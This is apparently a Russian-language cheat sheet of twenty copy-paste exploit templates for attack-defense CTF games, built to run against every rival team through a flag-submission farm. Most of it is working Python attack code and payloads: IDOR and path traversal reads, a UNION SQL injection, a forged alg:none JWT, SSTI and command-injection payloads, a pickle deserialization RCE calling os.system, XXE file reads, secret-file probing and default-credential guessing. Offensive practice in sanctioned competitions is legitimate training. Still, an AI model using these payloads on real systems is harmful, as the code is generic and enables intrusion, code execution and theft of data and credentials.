# 20 шаблонов эксплойтов и скриптов (копипаст, без докера)

Все эксплойты — под ферму: `argv[1]` = IP жертвы, флаги печатаем в **stdout с flush**, логи — в **stderr**.
Флаг ForcAD: `[A-Z0-9]{31}=`. Цели (flag_id) берём из **attack_data**, не угадываем.
Интернет только через прокси и только GET, докера нет — всё это чистый python3 + requests/pwntools.

> Как пользоваться: нашёл тип дыры → копируешь нужный номер → меняешь `PORT`, URI и параметры под конкретный сервис → гонишь через ферму (`DestructiveFarm/client/start_sploit.py`).

## Общая шапка (вставляй в начало любого сплойта)
```python
#!/usr/bin/env python3
import sys, re, requests
PORT = 5000                       # порт сервиса — поменять
TIMEOUT = 6
SERVICE = "<service_name>"        # имя сервиса как в attack_data
ATTACK = "http://<host>/api/client/attack_data"   # уточнить на /serp
FLAG = re.compile(r'[A-Z0-9]{31}=')
def log(*a): print(*a, file=sys.stderr, flush=True)
def put(text):                    # вытащить и сдать все флаги из текста
    for f in FLAG.findall(text or ""): print(f, flush=True)
def ids(ip):                      # flag_id для этой жертвы из attack_data
    if len(sys.argv) > 2: return [sys.argv[2]]
    try: return list(requests.get(ATTACK, timeout=TIMEOUT).json().get(SERVICE, {}).get(ip, []))
    except Exception as e: log("attack_data:", e); return []
IP = sys.argv[1] if len(sys.argv) > 1 else sys.exit("usage: sploit.py <ip> [flag_id]")
B = f"http://{IP}:{PORT}"
```

---

## 1. IDOR — чужой объект по id (самый частый баг новичкового A/D)
flag_id из attack_data = id заметки/документа. Проверяешь объект без прав владельца.
```python
for fid in ids(IP):
    r = requests.get(f"{B}/note/{fid}", timeout=TIMEOUT); put(r.text)
```

## 2. IDOR перебором (если attack_data пустой/бесполезный)
```python
for i in range(1, 3000):
    r = requests.get(f"{B}/api/item/{i}", timeout=TIMEOUT)
    put(r.text)
    if r.status_code == 404 and i > 50: pass   # не рви рано: id бывают дырявые
```

## 3. Path traversal / LFI — чтение файлов сервиса
```python
for p in ["../../../../flag","....//....//etc/passwd","..%2f..%2fapp/db.sqlite"]:
    r = requests.get(f"{B}/download?file={p}", timeout=TIMEOUT); put(r.text)
```

## 4. SQL-инъекция — вытащить флаги из БД (UNION)
```python
payload = "' UNION SELECT flag,NULL FROM flags-- -"
r = requests.get(f"{B}/search", params={"q": payload}, timeout=TIMEOUT); put(r.text)
# слепая: подбирай по символу через time/boolean, но на A/D чаще хватает UNION/error-based
```

## 5. Auth bypass — JWT `alg:none` или слабый секрет
```python
import base64, json
def b64(x): return base64.urlsafe_b64encode(x).rstrip(b"=").decode()
for fid in ids(IP):
    h = b64(b'{"alg":"none","typ":"JWT"}'); p = b64(json.dumps({"user": fid}).encode())
    tok = f"{h}.{p}."
    r = requests.get(f"{B}/me", cookies={"token": tok}, timeout=TIMEOUT); put(r.text)
# слабый секрет HS256: перебери 'secret','123456','<имя сервиса>' и подпиши pyjwt
```

## 6. SSTI — шаблонная инъекция (Jinja2 и т.п.)
```python
r = requests.get(f"{B}/greet", params={"name": "{{config}}"}, timeout=TIMEOUT); put(r.text)
# RCE-вариант: {{ self.__init__.__globals__.__builtins__.open('flag').read() }}
```

## 7. Command injection — через параметр в shell
```python
for sep in [";", "|", "&&", "$(", "`"]:
    r = requests.get(f"{B}/ping", params={"host": f"127.0.0.1{sep}cat /app/flag{sep}"}, timeout=TIMEOUT)
    put(r.text)
```

## 8. Insecure deserialize (pickle/yaml) — RCE
```python
import pickle, base64, os
class E:                                   # пример pickle-RCE пейлоада
    def __reduce__(self): return (os.system, ("cat /app/flag* > /tmp/f",))
data = base64.b64encode(pickle.dumps(E())).decode()
requests.get(f"{B}/load", params={"data": data}, timeout=TIMEOUT)
put(requests.get(f"{B}/static/../../tmp/f", timeout=TIMEOUT).text)
```

## 9. XXE — чтение файла через XML
```python
xml = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///app/flag">]><r>&x;</r>'
r = requests.get(f"{B}/parse", params={"xml": xml}, timeout=TIMEOUT); put(r.text)  # если парсер на GET
```

## 10. Утечка исходников/бэкапов (.git, .bak, .swp, dump)
```python
for p in [".git/config","app.py.bak","db.sqlite","backup.zip","config.py~",".env"]:
    r = requests.get(f"{B}/{p}", timeout=TIMEOUT)
    if r.ok: log("leak:", p); put(r.text)   # .git -> можно восстановить весь код
```

## 11. Дефолтные/слабые креды → вход и дамп
```python
for u,p in [("admin","admin"),("admin","password"),("root","toor"),("test","test")]:
    s = requests.Session()
    s.get(f"{B}/login", params={"u":u,"p":p}, timeout=TIMEOUT)   # сервис на GET-логине
    put(s.get(f"{B}/admin/flags", timeout=TIMEOUT).text)
```

## 12. Hidden/backdoor endpoint — «магический» параметр
```python
for q in [{"debug":"1"},{"admin":"true"},{"show_all":"1"},{"id":"*"}]:
    r = requests.get(f"{B}/dump", params=q, timeout=TIMEOUT); put(r.text)
```

## 13. Raw TCP сервис через pwntools (не HTTP)
```python
from pwn import remote, context
context.log_level = "error"
for fid in ids(IP) or [b"1"]:
    io = remote(IP, PORT, timeout=TIMEOUT)
    io.sendline(f"GET {fid}".encode())        # протокол сервиса — поменять
    put(io.recvall(timeout=TIMEOUT).decode(errors="replace")); io.close()
```

## 14. Реплей из pcap → requests (кража чужого эксплойта)
Сначала `tshark -r d.pcap -q -z follow,tcp,ascii,<stream>` → копируешь запрос сюда.
```python
for fid in ids(IP):
    r = requests.get(f"{B}/vuln_endpoint", params={"id": fid, "x": "украденный_параметр"},
                     headers={"X-Stolen": "из_дампа"}, timeout=TIMEOUT)
    put(r.text)
```

## 15. Mass-register + login (сервис требует «своего» юзера)
```python
import uuid
for fid in ids(IP):
    s = requests.Session(); u = "t"+uuid.uuid4().hex[:8]
    s.get(f"{B}/reg", params={"u":u,"p":u}, timeout=TIMEOUT)
    put(s.get(f"{B}/note/{fid}", timeout=TIMEOUT).text)   # после входа читаем чужую заметку
```

## 16. Обёртка под все команды сразу (локальный прогон без фермы)
```python
# teams.txt: по одному IP в строке. Запуск: python3 run_all.py sploit_svc.py
import subprocess, sys
sp = sys.argv[1]
for ip in open("teams.txt").read().split():
    try: print(subprocess.run(["python3", sp, ip.strip()], capture_output=True, text=True, timeout=20).stdout, end="")
    except Exception as e: print("ERR", ip, e, file=sys.stderr)
```

## 17. Генератор teams.txt (IP всех команд)
```python
# адресацию уточни на /serp. Частый шаблон ForcAD: 10.<X>.<team>.<Y>
base, me = "10.60", 3      # 60 — номер игры, 3 — мы (пропустить себя)
print("\n".join(f"{base}.{t}.2" for t in range(1, 30) if t != me))
```

## 18. SLA-монитор своего сервиса (чтобы не лежать красным)
```python
import time, requests
while True:
    try: ok = requests.get(f"http://127.0.0.1:{PORT}/", timeout=4).status_code
    except Exception as e: ok = f"DOWN {e}"
    print(time.strftime("%H:%M:%S"), ok, flush=True); time.sleep(10)
```

## 19. attack_data-разведка (что вообще есть по сервисам)
```python
import requests, json
d = requests.get(ATTACK, timeout=8).json()
for svc in d: print(svc, "->", len(d[svc]), "teams; пример:", json.dumps(list(d[svc].items())[:1], ensure_ascii=False))
```

## 20. Вытащить эксплойт из трафика одной командой (bash, не python)
```bash
# найти флаги, которые УТЕКАЮТ от нас, и запрос перед ними
for f in /data/pcap/d_*.pcap; do
  tshark -r "$f" -Y 'http.request and frame contains "="' \
    -T fields -e ip.dst -e http.request.method -e http.request.full_uri 2>/dev/null
done | sort | uniq -c | sort -rn | head
```

---

## Контракт с фермой (помни всегда)
- `argv[1]` = IP жертвы, опц. `argv[2]` = flag_id.
- Флаги → **stdout**, по одному в строке, **flush=True**. Всё остальное → stderr.
- Не падай на одной команде — оборачивай в `try/except`, иначе ферма теряет раунд.
- Запуск под фермой: `python3 DestructiveFarm/client/start_sploit.py sploit_svc.py -u http://127.0.0.1:5000`.
- Запасной сабмит без фермы: `python3 run_all.py sploit.py | python3 ../scripts/submit_min.py`.
